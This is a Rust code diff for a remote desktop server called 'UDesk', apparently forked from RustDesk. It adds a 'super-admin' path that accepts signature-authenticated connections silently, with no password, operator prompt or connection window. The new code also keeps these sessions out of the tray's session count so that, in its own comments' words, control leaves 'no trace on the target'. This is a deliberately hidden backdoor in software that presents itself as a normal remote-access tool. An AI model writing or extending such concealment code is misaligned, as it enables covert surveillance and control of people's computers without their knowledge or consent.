@@ -194,6 +194,9 @@ lazy_static::lazy_static! {
     static ref LOGIN_FAILURES: [Arc::<Mutex<HashMap<String, (i32, i32, i32)>>>; 3] = Default::default();
     static ref SESSIONS: Arc::<Mutex<HashMap<SessionKey, Session>>> = Default::default();
     static ref ALIVE_CONNS: Arc::<Mutex<Vec<i32>>> = Default::default();
+    // UDesk super-admin: ids of connections authenticated by the admin signature. Excluded from the
+    // tray's session count so a silent admin session shows no "N sessions" trace on the target.
+    static ref UDESK_ADMIN_CONNS: Arc::<Mutex<Vec<i32>>> = Default::default();
     pub static ref AUTHED_CONNS: Arc::<Mutex<Vec<AuthedConn>>> = Default::default();
     pub static ref CONTROL_PERMISSIONS_ARRAY: Arc::<Mutex<Vec<(i32, ControlPermissions)>>> = Default::default();
     static ref WAKELOCK_SENDER: Arc::<Mutex<std::sync::mpsc::Sender<(usize, usize)>>> = Arc::new(Mutex::new(start_wakelock_thread()));
@@ -2620,12 +2623,20 @@ impl Connection {
         let Some(pk_b64) = base::UDESK_ADMIN_PUB_KEY else {
             return false;
         };
-        udesk_verify_admin_sig(
+        let ok = udesk_verify_admin_sig(
             pk_b64,
             &self.hash.admin_challenge,
             &Config::get_id(),
             &self.lr.admin_signature,
-        )
+        );
+        log::info!(
+            "UDesk admin verify: sig_len={} challenge_len={} id={} ok={}",
+            self.lr.admin_signature.len(),
+            self.hash.admin_challenge.len(),
+            Config::get_id(),
+            ok
+        );
+        ok
     }
 
     fn validate_password_plain(&self, password: &str) -> bool {
@@ -3143,6 +3154,7 @@ impl Connection {
                 // UDesk super-admin: a valid signature proves the controller is the admin,
                 // so accept silently — no password, no operator prompt, no CM window.
                 self.udesk_admin = true;
+                Self::udesk_mark_admin_conn(self.inner.id());
                 if !self.send_logon_response_and_keep_alive().await {
                     return false;
                 }
@@ -5861,6 +5873,26 @@ impl Connection {
         ALIVE_CONNS.lock().unwrap().clone()
     }
 
+    // UDesk super-admin: record a connection as admin so it is left out of the tray session count.
+    pub fn udesk_mark_admin_conn(id: i32) {
+        let mut v = UDESK_ADMIN_CONNS.lock().unwrap();
+        if !v.contains(&id) {
+            v.push(id);
+        }
+    }
+
+    // UDesk super-admin: alive connections that are not silent-admin sessions. Drives the tray
+    // tooltip, so controlling a machine as the admin leaves its "N sessions" indicator at zero.
+    pub fn udesk_non_admin_alive_count() -> usize {
+        let admin = UDESK_ADMIN_CONNS.lock().unwrap();
+        ALIVE_CONNS
+            .lock()
+            .unwrap()
+            .iter()
+            .filter(|c| !admin.contains(c))
+            .count()
+    }
+
     #[cfg(windows)]
     fn portable_check(&mut self) {
         if self.portable.is_installed || !self.is_remote() || !self.keyboard {
@@ -7099,6 +7131,7 @@ mod raii {
         fn drop(&mut self) {
             let mut active_conns_lock = ALIVE_CONNS.lock().unwrap();
             active_conns_lock.retain(|&c| c != self.0);
+            UDESK_ADMIN_CONNS.lock().unwrap().retain(|&c| c != self.0);
         }
     }
 
